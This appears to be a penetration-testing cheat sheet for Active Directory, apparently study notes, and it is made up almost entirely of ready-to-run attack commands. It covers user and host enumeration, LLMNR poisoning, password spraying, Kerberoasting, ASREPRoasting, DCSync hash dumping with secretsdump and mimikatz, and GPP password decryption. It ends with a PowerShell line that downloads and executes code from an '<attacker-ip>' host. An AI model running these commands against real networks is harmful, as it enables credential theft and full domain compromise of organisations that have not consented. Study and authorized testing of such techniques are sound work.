## Initial Enumeration

Passive and active techniques to discover hosts, services, and domain information before authentication.

### DNS Lookup

Query DNS to discover IP-to-hostname mappings.

```bash
nslookup ns1.<domain>
```

### Packet Capture

Capture traffic on the network interface to passively observe domain communications.

```bash
sudo tcpdump -i ens224
```

### Responder Passive Analysis

Run Responder in analyze mode to observe LLMNR/NBT-NS/MDNS queries without poisoning.

```bash
sudo responder -I ens224 -A
```

### Host Discovery (fping)

Ping sweep a subnet to identify live hosts.

```bash
fping -asgq <subnet>
```

### Nmap Host Enumeration

Full enumeration scan with OS detection, version detection, scripts, and traceroute against a host list.

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/user/host-enum
```

### Kerbrute User Enumeration

Enumerate valid domain users without authentication using Kerberos pre-auth errors.

```bash
kerbrute userenum -d <DOMAIN> --dc <dc-ip> jsmith.txt -o kerb-results
```

---

## LLMNR/NBT-NS Poisoning

Capture NTLMv2 hashes by poisoning name resolution requests on the network.

### Responder (Linux)

```bash
sudo responder -I ens224
```

### Crack Captured NTLMv2 Hash

```bash
hashcat -m 5600 <hash-file> /usr/share/wordlists/rockyou.txt
```

### Inveigh (Windows - PowerShell)

```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### Inveigh (Windows - C# binary)

```cmd
.\Inveigh.exe
```

### Disable NBT-NS (Defense/Verify)

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
```

---

## Password Policy Enumeration

Gather password policy details to inform spraying cadence and avoid lockouts.

### CME via Valid Creds

```bash
crackmapexec smb <dc-ip> -u <username> -p <password> --pass-pol
```

### rpcclient NULL Session

```bash
rpcclient -U "" -N <dc-ip>
rpcclient $> querydominfo
```

### enum4linux

```bash
enum4linux -P <dc-ip>
enum4linux-ng -P <dc-ip> -oA ilfreight
```

### ldapsearch

```bash
ldapsearch -h <dc-ip> -x -b "DC=<DOMAIN>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### net accounts (Windows)

```cmd
net accounts
```

### PowerView

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

---

## User Enumeration (Unauthenticated)

### enum4linux

```bash
enum4linux -U <dc-ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### rpcclient

```bash
rpcclient -U "" -N <dc-ip>
rpcclient $> enumdomusers
```

### CrackMapExec

```bash
crackmapexec smb <dc-ip> --users
```

### ldapsearch

```bash
ldapsearch -h <dc-ip> -x -b "DC=<DOMAIN>,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

### windapsearch

```bash
./windapsearch.py --dc-ip <dc-ip> -u "" -U
```

---

## Password Spraying

### rpcclient One-Liner

```bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%<password>" -c "getusername;quit" <dc-ip> | grep Authority; done
```

### kerbrute

```bash
kerbrute passwordspray -d <domain> --dc <dc-ip> valid_users.txt <password>
```

### CrackMapExec

```bash
sudo crackmapexec smb <dc-ip> -u valid_users.txt -p <password> | grep +
```

### Validate a Single Set of Credentials

```bash
sudo crackmapexec smb <dc-ip> -u <username> -p <password>
```

### Local Auth Spray (avoid lockout)

```bash
sudo crackmapexec smb --local-auth <subnet> -u administrator -H <hash> | grep +
```

### DomainPasswordSpray (Windows)

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <password> -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## Security Controls Enumeration

### Check Windows Defender Status

```powershell
Get-MpComputerStatus
```

### Check AppLocker Policies

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Check PowerShell Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
```

### LAPS - Find Delegated Groups

```powershell
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

---

## Credentialed Enumeration (Linux)

### CrackMapExec - Users/Groups/Shares

```bash
sudo crackmapexec smb <dc-ip> -u <username> -p <password> --users
sudo crackmapexec smb <dc-ip> -u <username> -p <password> --groups
sudo crackmapexec smb <target-ip> -u <username> -p <password> --loggedon-users
sudo crackmapexec smb <dc-ip> -u <username> -p <password> --shares
sudo crackmapexec smb <dc-ip> -u <username> -p <password> -M spider_plus --share Dev-share
```

### smbmap

```bash
smbmap -u <username> -p <password> -d <DOMAIN> -H <dc-ip>
smbmap -u <username> -p <password> -d <DOMAIN> -H <dc-ip> -R SYSVOL --dir-only
```

### rpcclient - Query Users

```bash
rpcclient $> queryuser 0x457
rpcclient $> enumdomusers
```

### Impacket psexec / wmiexec

```bash
psexec.py <domain>/<username>:'<password>'@<target-ip>
wmiexec.py <domain>/<username>:'<password>'@<dc-ip>
```

### windapsearch - Domain Admins

```bash
python3 windapsearch.py --dc-ip <dc-ip> -u <domain>\<username> -p <password> --da
python3 windapsearch.py --dc-ip <dc-ip> -u <domain>\<username> -p <password> -PU
```

### BloodHound Python Ingestor

```bash
sudo bloodhound-python -u '<username>' -p '<password>' -ns <dc-ip> -d <domain> -c all
```

---

## Living Off the Land (Windows)

Using built-in tools to avoid dropping tooling on disk.

### Active Directory Module

```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

### Snaffler - Share File Discovery

Finds sensitive files in accessible shares.

```cmd
.\Snaffler.exe -d <DOMAIN> -s -v data
```

---

## Kerberoasting

Request TGS tickets for accounts with SPNs set and crack them offline.

### Impacket GetUserSPNs (Linux)

```bash
GetUserSPNs.py -dc-ip <dc-ip> <DOMAIN>/<username>
GetUserSPNs.py -dc-ip <dc-ip> <DOMAIN>/<username> -request
GetUserSPNs.py -dc-ip <dc-ip> <DOMAIN>/<username> -request-user sqldev -outputfile sqldev_tgs
```

### Crack Kerberoast Hash

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
```

### Enumerate SPNs (Windows)

```cmd
setspn.exe -Q */*
setspn.exe -T <DOMAIN> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### PowerView Kerberoast

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
```

### Rubeus Kerberoast

```powershell
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

### Mimikatz - Extract Tickets

```powershell
mimikatz # base64 /out:true
kerberos::list /export
```

---

## ASREPRoasting

Find accounts that don't require Kerberos pre-authentication and request their AS-REP hashes.

### PowerView - Find Vulnerable Accounts

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

### Rubeus

```powershell
.\Rubeus.exe asreproast /user:<username> /nowrap /format:hashcat
```

### Crack ASREPRoast Hash

```bash
hashcat -m 18200 asrep_hashes /usr/share/wordlists/rockyou.txt
```

### kerbrute - Enumerate and ASREP Roast

```bash
kerbrute userenum -d <domain> --dc <dc-ip> /opt/jsmith.txt
```

---

## ACL Enumeration

### Find Interesting ACLs (PowerView)

Finds objects in the domain where non-built-in accounts have modification rights.

```powershell
Find-InterestingDomainAcl
```

### Get ACLs for a Specific User's SID

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid <username>
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

### Reverse GUID Lookup

```powershell
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
```

### Enumerate ACLs for All Users (foreach loop)

```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("C:\Users\<username>\Desktop\ad_users.txt")) {
    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<DOMAIN>\\<username>'}
}
```

### Convert SDDL String to Readable Format

```powershell
ConvertFrom-SddlString
```

---

## DCSync

Replicate directory data as a domain controller to extract all password hashes.

### Check DCSync Rights

```powershell
Get-DomainUser -Identity <username> | select samaccountname,objectsid,memberof,useraccountcontrol | fl
$sid = "S-1-5-21-..."
Get-ObjectAcl "DC=<domain>,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### secretsdump.py (Linux)

```bash
secretsdump.py -outputfile hashes -just-dc <DOMAIN>/<username>@<dc-ip> -use-vss
```

### Mimikatz DCSync (Windows)

```powershell
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\administrator
```

---

## Privileged Access

### Enumerate Remote Desktop / WinRM Groups

```powershell
Get-NetLocalGroupMember -ComputerName <workstation> -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName <workstation> -GroupName "Remote Management Users"
```

### Create PSCredential and Enter-PSSession

```powershell
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<username>", $password)
Enter-PSSession -ComputerName <target> -Credential $cred
```

### evil-winrm (Linux)

```bash
evil-winrm -i <target-ip> -u <username>
```

---

## Miscellaneous Misconfigurations

### Check Printer Bug (MS-PRN)

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <dc-hostname>.<domain>
```

### adidnsdump - Resolve DNS Records Over LDAP

```bash
adidnsdump -u <domain>\\<username> ldap://<dc-ip>
adidnsdump -u <domain>\\<username> ldap://<dc-ip> -r
```

### Find Users with Passwords Not Required

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### List SYSVOL Scripts

```powershell
ls \\<dc-hostname>\SYSVOL\<domain>\scripts
```

---

## Group Policy Enumeration & Attacks

### Decrypt GPP Password

```bash
gpp-decrypt <hash>
```

### CME GPP Enumeration

```bash
crackmapexec smb -L | grep gpp
crackmapexec smb <dc-ip> -u <username> -p <password> -M gpp_autologin
```

### List GPO Names

```powershell
Get-DomainGPO | select displayname
Get-GPO -All | Select DisplayName
```

### Check Domain Users GPO Rights

```powershell
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

---

## File Transfer Techniques

### Python HTTP Server

```bash
sudo python3 -m http.server 8001
```

### PowerShell Download

```powershell
IEX(New-Object Net.WebClient).downloadString('http://<attacker-ip>/SharpHound.exe')
```

### Impacket SMB Server

```bash
impacket-smbserver -ip <attacker-ip> -smb2support -username user -password password shared /home/administrator/Downloads/
```
